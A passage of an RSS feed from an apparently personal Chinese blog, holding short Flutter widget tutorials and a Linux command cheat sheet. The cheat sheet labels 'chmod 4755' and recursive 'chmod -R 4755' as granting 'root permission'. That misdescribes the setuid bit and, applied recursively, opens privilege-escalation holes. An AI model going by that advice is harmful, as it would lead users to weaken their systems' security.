          &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; BottomSheet(...);
        });
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5showcupertinomodalpopup&#34;&gt;5.showCupertinoModalPopup&lt;/h2&gt;
&lt;p&gt;showCupertinoModalPopup 展示 ios 的风格弹出框，通常情况下和 CupertinoActionSheet 配合使用，用法如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;showCupertinoModalPopup(
    context: context,
    builder: (BuildContext context) {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; CupertinoActionSheet(
        title: Text(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;提示&amp;#39;&lt;/span&gt;),
        message: Text(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;是否要删除当前项？&amp;#39;&lt;/span&gt;),
        actions: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;Widget&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;[
          CupertinoActionSheetAction(
            child: Text(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;删除&amp;#39;&lt;/span&gt;),
            onPressed: () {},
            isDefaultAction: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;,
          ),
          CupertinoActionSheetAction(
            child: Text(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;暂时不删&amp;#39;&lt;/span&gt;),
            onPressed: () {},
            isDestructiveAction: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;,
          ),
        ],
      );
    }
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6其他&#34;&gt;6.其他&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;showMenu()
showSearch()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Flutter—CupertinoPicker 滚轮选择器</title>
        <link>https://ac-lm.github.io/posts/flutter/fluttercupertinopicker-%E6%BB%9A%E8%BD%AE%E9%80%89%E6%8B%A9%E5%99%A8/</link>
        <pubDate>Tue, 18 May 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/fluttercupertinopicker-%E6%BB%9A%E8%BD%AE%E9%80%89%E6%8B%A9%E5%99%A8/</guid>
        <description>&lt;h2 id=&#34;1组件使用&#34;&gt;1.组件使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;Container(
           height: &lt;span style=&#34;color:#ae81ff&#34;&gt;120&lt;/span&gt;,
           width: &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;,
           child: CupertinoPicker(
                    itemExtent: &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;,
                    onSelectedItemChanged: (position) {},
                    children: [ Text(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192&amp;#34;&lt;/span&gt;) ]
         ),),
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Flutter—Fluttertoast 插件弹出提示</title>
        <link>https://ac-lm.github.io/posts/flutter/flutterfluttertoast-%E6%8F%92%E4%BB%B6%E5%BC%B9%E5%87%BA%E6%8F%90%E7%A4%BA/</link>
        <pubDate>Mon, 17 May 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutterfluttertoast-%E6%8F%92%E4%BB%B6%E5%BC%B9%E5%87%BA%E6%8F%90%E7%A4%BA/</guid>
        <description>&lt;h2 id=&#34;1引入插件&#34;&gt;1.引入插件&lt;/h2&gt;
&lt;p&gt;在 pubspec.yaml 中添加依赖:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;fluttertoast&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;^4.0.1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2使用&#34;&gt;2.使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;package:fluttertoast/fluttertoast.dart&amp;#39;&lt;/span&gt;;

RaisedButton(
  child: Text(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;弹出toast&amp;#34;&lt;/span&gt;),
  onPressed: () {
    Fluttertoast.showToast(
                    msg: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;你今天真好看&amp;#34;&lt;/span&gt;,
                    toastLength: Toast.LENGTH_SHORT,
                    gravity: ToastGravity.BOTTOM,
                    timeInSecForIosWeb: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
                    backgroundColor: Colors.black45,
                    textColor: Colors.white,
                    fontSize: &lt;span style=&#34;color:#ae81ff&#34;&gt;16.0&lt;/span&gt;);
  },
)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Flutter—Row 子控件两端对齐</title>
        <link>https://ac-lm.github.io/posts/flutter/flutterrow-%E5%AD%90%E6%8E%A7%E4%BB%B6%E4%B8%A4%E7%AB%AF%E5%AF%B9%E9%BD%90/</link>
        <pubDate>Sun, 16 May 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutterrow-%E5%AD%90%E6%8E%A7%E4%BB%B6%E4%B8%A4%E7%AB%AF%E5%AF%B9%E9%BD%90/</guid>
        <description>&lt;h2 id=&#34;1使用-spacebetween-对齐方式&#34;&gt;1.使用 spaceBetween 对齐方式&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Row(
  mainAxisAlignment: MainAxisAlignment.spaceBetween,
  children: [
    &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Text(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;left&amp;#34;&lt;/span&gt;),
    &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Text(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;right&amp;#34;&lt;/span&gt;)
  ]
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2中间使用-expanded-自动扩展&#34;&gt;2.中间使用 Expanded 自动扩展&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;Row(
  children: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;Widget&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;[
    FlutterLogo(),&lt;span style=&#34;color:#75715e&#34;&gt;//左对齐
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Expanded(child: SizedBox()),&lt;span style=&#34;color:#75715e&#34;&gt;//自动扩展挤压
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    FlutterLogo(),&lt;span style=&#34;color:#75715e&#34;&gt;//右对齐
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  ],
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3使用-spacer-自动填充&#34;&gt;3.使用 Spacer 自动填充&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;Row(
  children: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;Widget&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;[
    FlutterLogo(),
    Spacer(),
    FlutterLogo(),
  ],
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4使用-flexible&#34;&gt;4.使用 Flexible&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;Row(
  children: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;Widget&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;[
    FlutterLogo(),
    Flexible(fit: FlexFit.tight, child: SizedBox()),
    FlutterLogo(),
  ],
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux—常用的命令</title>
        <link>https://ac-lm.github.io/posts/linux/linux%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4/</link>
        <pubDate>Sun, 16 May 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linux%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4/</guid>
        <description>&lt;h2 id=&#34;1历史记录命令&#34;&gt;1.历史记录命令&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;history -c 
&lt;span style=&#34;color:#75715e&#34;&gt;# 参数!n（n命令编号），执行第n个命令&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 参数!$ / !!（上一个命令），执行上一条命令，&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 参数-c（清理），清理历史记录&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2文件查看命令&#34;&gt;2.文件查看命令&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ls  &lt;span style=&#34;color:#75715e&#34;&gt;#查看当前全部文件&lt;/span&gt;
ll  &lt;span style=&#34;color:#75715e&#34;&gt;#以详细信息列出文件&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#------------------------------------------------&lt;/span&gt;
-a &lt;span style=&#34;color:#75715e&#34;&gt;#显示所有文件及目录 (. 开头的隐藏文件也会列出)&lt;/span&gt;
-l &lt;span style=&#34;color:#75715e&#34;&gt;#除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出&lt;/span&gt;
-r &lt;span style=&#34;color:#75715e&#34;&gt;#将文件以相反次序显示(原定依英文字母次序)&lt;/span&gt;
-t &lt;span style=&#34;color:#75715e&#34;&gt;#将文件依建立时间之先后次序列出&lt;/span&gt;
-A &lt;span style=&#34;color:#75715e&#34;&gt;#同 -a ，但不列出 &amp;#34;.&amp;#34; (目前目录) 及 &amp;#34;..&amp;#34; (父目录)&lt;/span&gt;
-F &lt;span style=&#34;color:#75715e&#34;&gt;#在列出的文件名称后加一符号；例如可执行档则加 &amp;#34;*&amp;#34;, 目录则加 &amp;#34;/&amp;#34;&lt;/span&gt;
-R &lt;span style=&#34;color:#75715e&#34;&gt;#若目录下有文件，则以下之文件亦皆依序列出&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3文件夹操作命令&#34;&gt;3.文件夹操作命令&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cd ..  &lt;span style=&#34;color:#75715e&#34;&gt;#进入父文件夹&lt;/span&gt;
cd ~   &lt;span style=&#34;color:#75715e&#34;&gt;#root&lt;/span&gt;
cd /   &lt;span style=&#34;color:#75715e&#34;&gt;#根&lt;/span&gt;
rm -rf xxxx  &lt;span style=&#34;color:#75715e&#34;&gt;#删除&lt;/span&gt;
vi test.txt  &lt;span style=&#34;color:#75715e&#34;&gt;#编辑&lt;/span&gt;
vim test.txt  &lt;span style=&#34;color:#75715e&#34;&gt;#编辑&lt;/span&gt;
chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;4755&lt;/span&gt; filename &lt;span style=&#34;color:#75715e&#34;&gt;#Root权限&lt;/span&gt;
chmod -R &lt;span style=&#34;color:#ae81ff&#34;&gt;4755&lt;/span&gt; filename &lt;span style=&#34;color:#75715e&#34;&gt;#对全部文件加权限&lt;/span&gt;
chown root KI.txt &lt;span style=&#34;color:#75715e&#34;&gt;#把所有者设置 root&lt;/span&gt;
less as.sh &lt;span style=&#34;color:#75715e&#34;&gt;#文件查看，q退出&lt;/span&gt;
head -n &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; as.sh &lt;span style=&#34;color:#75715e&#34;&gt;#查看文件的开头部分的内容，参数 -n 用于显示行数，默认为 10&lt;/span&gt;
tail as.sh &lt;span style=&#34;color:#75715e&#34;&gt;#查看文件&lt;/span&gt;
tail -f as.sh &lt;span style=&#34;color:#75715e&#34;&gt;#不断更新最后一行，循环查看&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4链接&#34;&gt;4.链接&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ln -s log2013.log link2013 
&lt;span style=&#34;color:#75715e&#34;&gt;# 将log2013.log 链接到 link2013,输入 link2013 可访问 log2013.log&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5重定向&#34;&gt;5.重定向&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ping baidu.com &amp;gt;&amp;gt; A.txt
&lt;span style=&#34;color:#75715e&#34;&gt;# 将命令的输出重定向到文档，即将结果写入文档，&amp;gt;不追加，&amp;gt;&amp;gt;追加&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6管道与搜索&#34;&gt;6.管道与搜索&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;echo ABCDE | grep A
&lt;span style=&#34;color:#75715e&#34;&gt;# 管道命令（|）将前一个命令的输出作为后一个命令的输入，搜索命令（grep）对输入进行搜索&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Flutter—滚动视图的位置保存</title>
        <link>https://ac-lm.github.io/posts/flutter/flutter%E6%BB%9A%E5%8A%A8%E8%A7%86%E5%9B%BE%E7%9A%84%E4%BD%8D%E7%BD%AE%E4%BF%9D%E5%AD%98/</link>
        <pubDate>Sat, 15 May 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutter%E6%BB%9A%E5%8A%A8%E8%A7%86%E5%9B%BE%E7%9A%84%E4%BD%8D%E7%BD%AE%E4%BF%9D%E5%AD%98/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/questions/60292911/how-to-get-flutter-scrollcontroller-to-save-position-of-listview-builder-when&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; how-to-get-flutter-scrollcontroller-to-save @stackoverflow &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;使用-automatickeepaliveclientmixin-保存状态&#34;&gt;使用 AutomaticKeepAliveClientMixin 保存状态&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GetListView&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; StatefulWidget&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color:#a6e22e&#34;&gt;@override&lt;/span&gt;
  State&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;StatefulWidget&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;createState&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;_GetListViewState&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_GetListViewState&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; State&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;GetListView&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; with AutomaticKeepAliveClientMixin&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;GetListView&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;{&lt;/span&gt;

  &lt;span style=&#34;color:#a6e22e&#34;&gt;@override&lt;/span&gt;
  Widget &lt;span style=&#34;color:#a6e22e&#34;&gt;build&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;BuildContext context&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ListView&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;builder&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;

                itemCount: 2000&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
                itemBuilder&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
                  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ListTile&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
                      title&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Text&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
                    i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(),&lt;/span&gt;
                    textScaleFactor&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; 1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
                    style&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; TextStyle&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;color&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Colors&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;blue&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
                  &lt;span style=&#34;color:#f92672&#34;&gt;));&lt;/span&gt;
                &lt;span style=&#34;color:#f92672&#34;&gt;});&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color:#a6e22e&#34;&gt;@override&lt;/span&gt;
  bool get wantKeepAlive &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;使用-pagestoragekey-保存偏移&#34;&gt;使用 PageStorageKey 保存偏移&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;ListView&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;builder&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
                key&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; PageStorageKey&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;String&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;controllerA&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
                controller&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; ScrollController&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;keepScrollOffset&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
                itemCount&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; 2000&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
                itemBuilder&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
                  print&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Rebuilded 1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
                  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ListTile&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
                      title&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Text&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
                    i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(),&lt;/span&gt;
                    textScaleFactor&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; 1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
                    style&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; TextStyle&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;color&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Colors&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;blue&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt;
                  &lt;span style=&#34;color:#f92672&#34;&gt;));&lt;/span&gt;
                &lt;span style=&#34;color:#f92672&#34;&gt;}),&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux—Chrome 的安装配置</title>
        <link>https://ac-lm.github.io/posts/linux/linuxchrome-%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</link>
        <pubDate>Sat, 15 May 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linuxchrome-%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</guid>
        <description>&lt;h2 id=&#34;1chrome-安装&#34;&gt;1.Chrome 安装&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 下载-------------------------------------------&lt;/span&gt;
wget https:&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;dl&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;google&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;com&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;linux&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;direct&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;google&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;chrome&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;stable_current_x86_64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rpm
&lt;span style=&#34;color:#75715e&#34;&gt;# 安装依赖-------------------------------------------------------------&lt;/span&gt;
yum install libX11 libXcursor libXdamage libXext libXcomposite libXi libXrandr gtk3 libappindicator&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;gtk3 xdg&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;utils libXScrnSaver liberation&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;fonts
&lt;span style=&#34;color:#75715e&#34;&gt;# 执行安装--------------------------------------------------------------------&lt;/span&gt;
rpm &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;ivh google&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;chrome&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;stable_current_x86_64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rpm
